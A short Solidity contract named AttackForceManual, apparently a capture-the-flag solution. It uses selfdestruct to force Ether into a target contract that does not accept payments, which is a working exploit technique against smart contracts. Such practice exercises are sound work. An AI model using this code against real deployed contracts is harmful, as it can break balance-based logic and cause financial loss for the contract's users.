pragma solidity ^0.8.0;
contract AttackForceManual {
    address payable private instance;

    constructor(address payable _instance) {
        instance = _instance;
    }

    receive() external payable {}

    function attack() public payable {
        selfdestruct(instance);
    }
}
